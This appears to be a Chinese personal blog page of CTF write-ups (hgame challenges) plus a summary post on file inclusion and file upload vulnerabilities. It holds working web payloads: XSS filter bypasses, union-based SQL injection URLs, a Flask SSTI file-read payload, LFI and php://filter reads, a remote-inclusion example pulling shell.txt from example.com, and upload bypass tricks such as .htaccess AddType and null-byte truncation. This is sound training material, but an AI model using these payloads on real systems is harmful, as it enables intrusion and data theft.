<p>当时看了好几篇文章，还可以00截断</p>
<p>把过滤的用unicode转一下，发现去掉<code>&lt;img &gt;</code>是可以的,后面加个<code>%00</code></p>
<p><code>x&quot; type=&quot;&amp;#105;&amp;#109;&amp;#97;&amp;#103;&amp;#101;&quot; src=&quot;1&quot; onerror=&quot;alert&amp;#40;1&amp;#41;&quot; name=&quot;xx&quot;&gt;%00</code></p>
<p>其实就是<code>&lt;input value=&quot;x&quot; type=&quot;image&quot; src=&quot;x&quot; onerror=&quot;alert(1)&quot; name=&quot;xx&quot;&gt;</code></p>
<p>也可以不用截断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; type=&quot;&amp;#105;&amp;#109;&amp;#97;&amp;#103;&amp;#101;&quot; &amp;#60;&amp;#105;&amp;#109;&amp;#103;&amp;#10; src=&quot;1&quot; onerror=&quot;alert&amp;#40;1&amp;#41;&quot;&amp;#62; name=&quot;1</span><br></pre></td></tr></table></figure>
<p>发现还能更简短</p>
<p><code>x&quot; type=&quot;&amp;#105;&amp;#109;&amp;#97;&amp;#103;&amp;#101;&quot; src=&quot;1&quot; onerror=&quot;alert&amp;#40;1&amp;#41;</code></p>
<p>拿到的flag是<code>hgame</code></p>
<h3 id="送分的SQLi"><a href="#送分的SQLi" class="headerlink" title="送分的SQLi"></a>送分的SQLi</h3><p>这个简单的还是可以做的</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da6bee9344.jpg" alt="1.jpg"></p>
<p>id，可以查询到chutiren和admin</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da6beeb795.jpg" alt="2.jpg"></p>
<p>order by 查询字段，表示只有两个</p>
<p>查询数据库</p>
<p><code>http://118.25.18.223:10068/?id=1%20union%20select%201,database()#</code></p>
<p><img src="https://i.loli.net/2018/07/29/5b5da6beea44d.jpg" alt="3.jpg"></p>
<p>库名叫week3_sqliiii2</p>
<p>查询库里的表名</p>
<p><code>http://118.25.18.223:10068/?id=1%20union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20=%20%27week3_sqliiii2%27)%23</code></p>
<p><img src="https://i.loli.net/2018/07/29/5b5da6beeacee.jpg" alt="4.jpg"></p>
<p>接下来明显要查f111aa4g这个表的列</p>
<p><code>http://118.25.18.223:10068/?id=1%20union%20select%201,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema%20=%20%27week3_sqliiii2%27%20and%20table_name=%27f111aa4g%27)%23</code></p>
<p><img src="https://i.loli.net/2018/07/29/5b5da6bf283b8.jpg" alt="5.jpg"></p>
<p>获取flag</p>
<p><code>http://118.25.18.223:10068/?id=1%20union%20select%201,(select%20group_concat(id,%27*%27,dajiangyoude,%27*%27,f111aaaggg_w3)%20from%20week3_sqliiii2.f111aa4g)%23</code></p>
<p><img src="https://i.loli.net/2018/07/29/5b5da6bf28caa.jpg" alt="6.jpg"></p>
<h3 id="ngc’s-blog"><a href="#ngc’s-blog" class="headerlink" title="ngc’s blog"></a>ngc’s blog</h3><p>描述</p>
<p>ngc的博客</p>
<p>hint：ngc不想用php，于是我向他推荐了flask ——ash</p>
<p>看到flash，关键得到表哥的提示<strong><em>ssti注入</em></strong></p>
<p>我百度到一篇文章</p>
<p><a href="https://www.cnblogs.com/tyomcat/p/5440488.html" target="_blank" rel="noopener">服务端模板注入(SSTI攻击) - tyomcat - 博客园</a></p>
<p>虽然不怎么懂，不过照做就行</p>
<p>把</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>放到url后面</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dce6a51ab2.jpg" alt="25.jpg"></p>
<p>看这跟文章里一样，也有<code>&lt;type &#39;file&#39;&gt;</code>类,</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dce6a28eb9.jpg" alt="26.jpg"></p>
<p>我不知道索引在哪看的，把后面代码的<code>/etc/passwd</code>改成flag</p>
<p>因为，题目里有提示，flag在flag里</p>
<p>然后就得到flag了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;flag&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/07/29/5b5dce6a27587.jpg" alt="27.jpg"></p>
<h3 id="easy-Caesar"><a href="#easy-Caesar" class="headerlink" title="easy Caesar"></a>easy Caesar</h3><p>题目描述：相信你们都知道啥是凯撒加密的，so Ciphertext：<code>vuoas{Hvs_ei8qy_pf7kb_1l_xIadg_cjSf_o_Zo9m_rCu}</code></p>
<p>凯撒解密</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dceda8f2c9.jpg" alt="12.jpg"></p>
<p>flag居然不对，纳闷了好久。。</p>
<p>感觉数字有问题，发现所有列举出来的结果中，数字都没变</p>
<p>把8改成1较合理，同样7改0，9改7，两两相差7，唯独1不知道改什么</p>
<p>挨个试试，发现1改4。。</p>
<p>所以flag是</p>
<p><code>hgame{The_qu1ck_br0wn_4x_jUmps_ovEr_a_La2y_dOg}</code></p>
<h3 id="confusion"><a href="#confusion" class="headerlink" title="confusion"></a>confusion</h3><p>题目是一段–/.-./.-../-/-.-/-…./-.-/-..-/-./…-/–../-..-/–.-/.–/-…/…/-./.-/..—/..-./…/..-/..—/–./–./-…/…/.–/….-/…../-…/…/.-../.-/–../..-./..-/-…./…/…-/.—/-…/-./-../.-/–../…/.-./…./..-/-…./–.-/-…-/-…-/-…-/-…-</p>
<p>一猜就是摩斯密码</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dcef7edf5e.jpg" alt="7.jpg"></p>
<p>得到的一段还以为是base64，转出来是乱码，那就是base32了</p>
<p>直接在IDLE里转了，转完32，还得转次63</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dcef7ea36d.jpg" alt="8.jpg"></p>
<p>花括号这么靠后，不是flag标准形式，因该是栅栏解密</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dcef7c9c61.jpg" alt="9.jpg"></p>
<p>明显还得再用凯撒解密</p>
<p>列出所有组合，得到flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dcef801e31.jpg" alt="10.jpg"></p>
<h3 id="re0"><a href="#re0" class="headerlink" title="re0"></a>re0</h3><p>下载了一个re0.exe，放到ida里</p>
<p>f5查看伪代码</p>
<p>就得到了flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dcf1b78978.jpg" alt="11.jpg"></p>
<h3 id="pacp1"><a href="#pacp1" class="headerlink" title="pacp1"></a>pacp1</h3><p>下载flag.pcap，wireshark分析</p>
<p>嗯。。在分组详情里面搜索hgame字符串就行了</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dcf1be4bb4.jpg" alt="13.jpg"></p>
<h3 id="草莓社区-1"><a href="#草莓社区-1" class="headerlink" title="草莓社区-1"></a>草莓社区-1</h3><p>描述</p>
<p>flag在<code>../flag.php</code>中</p>
<p>知识点：LFI</p>
<p>本地包含</p>
<p>试下那个flag.php，最后要这样写</p>
<p><code>118.25.18.223:10011/show_maopian.php?mao=../flag.php</code></p>
<p>抓包，在response里得到flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dcf1b7a639.jpg" alt="14.jpg"></p>
<p>还必须是<code>../flag</code>，必须两个点。。</p>
<h3 id="草莓社区-2"><a href="#草莓社区-2" class="headerlink" title="草莓社区-2"></a>草莓社区-2</h3><p>和草莓社区-1差不多，在<code>../flag</code>里</p>
<p>这里可通过PHP内置协议直接读取<code>../flag</code>的代码</p>
<p>之前做过类似的题，blog上有记录，直接搬过来改一改</p>
<p><code>php://filter/read=convert.base64-encode/resource=../flag.php</code></p>
<p>同草莓社区-1一样加在<code>show_maopian.php?mao=</code>后面</p>
<p>flag还是在response里，将返回的base64解码即可</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dce3c410dd.jpg" alt="15.jpg"></p>
<h3 id="White-cosmos"><a href="#White-cosmos" class="headerlink" title="White cosmos"></a>White cosmos</h3><p>压缩包内有个pure.txt，内容好像是一些空格，反正没有文字</p>
<p>hex fiend看一看</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dce3c410c1.jpg" alt="16.jpg"></p>
<p>这个<code>0x09</code>就是tab键，<code>0x20</code>可能空格吧</p>
<p>我就把09当<code>”-“</code>，20当<code>”.“</code>，空格当<code>”/“</code>分隔，转成了摩尔斯码</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dce3be8beb.jpg" alt="17.jpg"></p>
<p>解码后是</p>
<p><code>QHZ%ueZFQCZC%ufPC%ueZCQBZPPHQCZCY%uePLY%ueC%ueQHXF%ueBZCY%ue%ueP%ueHPBZPZC%ufK</code></p>
<p>感觉不对，回头把09当1，20当0转成二进制</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dce3c35b2e.jpg" alt="18.jpg"></p>
<p>结果转不出来，于是将hgame转成二进制对比发现开头得加个0！</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dcf8769217.jpg" alt="19.jpg"></p>
<p>flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dce3c16f4f.jpg" alt="20.jpg"></p>
<h3 id="easy-password"><a href="#easy-password" class="headerlink" title="easy password"></a>easy password</h3><p>描述</p>
<p>听说你们有人喜欢暴力解题，那么就来暴力一下，测测电脑性能吧。</p>
<p>hint:小写字母+数字</p>
<p>我还以为伪加密，没折腾出来</p>
<p>老实爆破了</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dce3c4a8c9.jpg" alt="21.jpg"></p>
<p>flag</p>
<p><code>hgame{0pos_You_5ound_m3_HAHA}</code></p>
<hr>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/02/10/nmap_mind/">Nmap_思维导图（转）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-02-10</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/tool/">tool</a></span><div class="content"><p>转自blog：<a href="http://mtfly.net/140" target="_blank" rel="noopener">Mtfly | 啥都不会</a></p></div><a class="more" href="/2018/02/10/nmap_mind/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/01/30/file-upload/">文件包含&amp;&amp;文件上传</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-01-30</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/文件包含-文件上传/">文件包含 文件上传</a></span><div class="content"><a id="more"></a>
<h3 id="0x01-文件包含"><a href="#0x01-文件包含" class="headerlink" title="0x01 文件包含"></a>0x01 文件包含</h3><ul>
<li>本地文件包含(Loacl File Inclusion,LFI)</li>
</ul>
<blockquote>
<p>通过浏览器引进(包含)web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格 的过滤允许遍历目录的字符注入浏览器并执行 </p>
</blockquote>
<ul>
<li>远程文件包含(Remote File Inclusion,RFI)</li>
</ul>
<blockquote>
<p>该漏洞允许攻击者包含一个远程的文件,一般是在远程服务器上预先设置好的脚本。 此漏洞是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码</p>
</blockquote>
<ul>
<li>条件： <ul>
<li>php.ini中配置项：</li>
<li>allow_ url_fopen     ON</li>
<li>allow_ url_include   ON  </li>
</ul>
</li>
</ul>
<ul>
<li><p>本地包含：</p>
<ul>
<li>?file=flag.txt </li>
<li>?file=../../../../../../../../../var/lib/locate.db </li>
<li>?file=../../../../../../../../../usr/local/apache2/conf/httpd</li>
</ul>
</li>
<li><p>远程文件包含：</p>
<ul>
<li>?file=[http|https|ftp]://example.com/shell.txt  </li>
<li>(需要allow_url_fopen=On并且 allow_url_include=On)   </li>
</ul>
</li>
</ul>
<ul>
<li><p>PHP中常见的文件包含函数</p>
<ul>
<li>include()：当使用该函数包含文件时，<strong><em>只有代码执行到include()函数是才将文件包含进来</em></strong>，发生错误时只给出一个警告，继续向下执行<ul>
<li>include_once()：功能和include()相同，区别在于当重复调用同意文件时，程序只调用一次</li>
<li>requier()： 使用require函数包含文件时，<strong><em>只要程序一执行，立即调用脚本；</em></strong>如果前者执行发生错误，函数或输出错误信息，并终止脚本运行</li>
<li>require_once()：功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</li>
</ul>
</li>
</ul>
</li>
<li><p>jsp/Servlet</p>
<ul>
<li>ava.io.file() , java.io.filereader() ….</li>
</ul>
</li>
<li><p>asp</p>
<ul>
<li>include file , include virtual   </li>
</ul>
</li>
<li><p>漏洞利用及危害</p>
<ul>
<li>上传图片，包含图片Getshell</li>
<li>读文件，读PHP文件</li>
<li>包含日志文件GetShell</li>
<li>包含/proc/self/environ文件GetShell</li>
<li>如果有phpinfo可以包含临时文件</li>
<li>包含data:// 或者 php://input 等协议（需要allow_url_include=on） </li>
<li>执行任意脚本代码</li>
<li>控制网站</li>
<li>控制服务器</li>
</ul>
</li>
<li><p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。</p>
</li>
</ul>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="https://i.loli.net/2018/07/29/5b5dd090be2d7.jpg" alt="6.jpg"></p>
<p>click之后是一个test，url变为</p>
<p><code>http://4.chinalover.sinaapp.com/web7/index.php?file=show.php</code></p>
<p>这里可以通过PHP内置协议直接读取index的代码</p>
<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
<p>页面是index.php的base64加密后的代码,解密即可</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dd090d2bd3.jpg" alt="5.jpg"></p>
<h3 id="0x02-文件上传"><a href="#0x02-文件上传" class="headerlink" title="0x02 文件上传"></a>0x02 文件上传</h3><blockquote>
<p>文件上传漏洞就是利用可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码</p>
</blockquote>
<ul>
<li><p>原因</p>
<ul>
<li><p>对于上传文件的后缀名（扩展名）没有做较为严格的限制</p>
</li>
<li><p>对于上传文件的MIMETYPE 没有做检查</p>
</li>
<li><p>权限上没有对于上传的文件的文件权限，（尤其是对于shebang类型的文件）</p>
</li>
<li><p>对于web server对于上传文件或者指定目录的行为没有做限制</p>
</li>
</ul>
</li>
</ul>
<p><strong>注：</strong></p>
<blockquote>
<ol>
<li>MIMETYPE即媒体类型，通过Content-Type来表示。</li>
<li>代替magic number做文本文件的metadata的，一是扩展名，一是shebang</li>
<li>magic number：很多类型的文件，其起始的几个字节的内容是固定的（或是有意填充，或是本就如此）。因此这几个字节的内容也被称为魔数 (magic number)，因为根据这几个字节的内容就可以确定文件类型。</li>
<li>metadata即元数据：描述数据的数据，对数据及信息资源的描述性信息。</li>
</ol>
</blockquote>
<p>感觉较好的博文：</p>
<p><a href="https://www.cnblogs.com/shellr00t/p/6426945.html" target="_blank" rel="noopener">典型漏洞归纳之上传漏洞 - sm0nk - 博客园</a></p>
<p><a href="http://blog.51cto.com/wt7315/1865580" target="_blank" rel="noopener">文件上传漏洞及解析漏洞总结-罹殇-51CTO博客</a></p>
<p><strong><em><u>以下七点内容源自</u></em></strong><a href="https://www.cnblogs.com/xishaonian/p/6417729.html" target="_blank" rel="noopener">文件上传漏洞的一些总结 - 珍惜少年时 - 博客园</a></p>
<ol>
<li><p>MIME类型绕过:<br>上传木马时，提示格式错误。直接抓包修改Content-Type 为正确的格式尝试绕过</p>
</li>
<li><p>文件扩展名绕过：<br>Php除了可以解析php后缀 还可以解析php2.php3，php4 后缀</p>
</li>
<li><p>文件内容检测绕过：<br>抓包，在正常图片末尾添加一句话木马</p>
</li>
<li><p>00截断绕过上传<br>1.php .jpg   空格二进制20改为00<br>IIS 6.0 目录路径检测解析绕过<br>上传路径改为<br>XXX/1.asp/</p>
</li>
<li><p>IIS6.0 解析缺陷漏洞绕过<br>上传路径出修改<br>XXX/1.php;<br>Apache 解析缺陷绕过上传漏洞<br>修改后缀名<br>122.php.7zz（7zz不能识别的后缀名）</p>
</li>
<li><p>htaccess解析漏洞：<br>上传的jpg文件都会以php格式解析<br>.htaccess内容：<br>AddType    application/x-httpd-php    .jpg</p>
</li>
<li><p>fck编辑器版本识别及信息收集<br>版本地址（2.2.4/2.2.6）<br><code>_samples/default.html</code><br><code>_whatsnew.html</code><br>Fck2.2.4 上传地址：<br><code>editor/filemanager/browser/default/comectors/test.htm</code><br><code>editor/filemanager/upload/test.html</code><br>V2.2.6<br><code>editor/filemanager/connectors/test.html</code><br><code>............................................../uploadtest.html</code></p>
</li>
</ol>
<p>fck编辑器解析漏洞<br>/1.asp/下创建文件夹2.asp （2.asp会被转成2_asp）</p>
<h3 id="一个南邮的CTF题—上传绕过"><a href="#一个南邮的CTF题—上传绕过" class="headerlink" title="一个南邮的CTF题—上传绕过"></a>一个南邮的CTF题—上传绕过</h3><p><img src="https://i.loli.net/2018/07/29/5b5dd0b1183db.jpg" alt="8.jpg"></p>
<p>上传图片并抓包，尝试各种拓展名修改，00截断等，无果，试了下uploads，修改下dir  ，随便改为/uploads/002.php</p>
<p>reponse中filename为除拓展名的部分，basename即为最终文件名，最终为022.php011.png，和filename部分拼到一起了</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dd0b1654e9.jpg" alt="10.jpg"></p>
<p>测试了下在filename前加一个00截断，然而行不通，那就可以在022.php后加一个00截断</p>
<p><img src="https://i.loli.net/2018/07/29/5b5dd0b153f28.jpg" alt="9.jpg"></p>
<p>防范：</p>
<ul>
<li>文件扩展名服务端白名单校验。</li>
<li>文件内容服务端校验。</li>
<li>上传文件重命名。</li>
<li>隐藏上传文件路径</li>
</ul>
<p><strong><em>白名单是最有保障的安全措施</em></strong>    </p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2019/03/17/5c8e54b412bc5.png)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>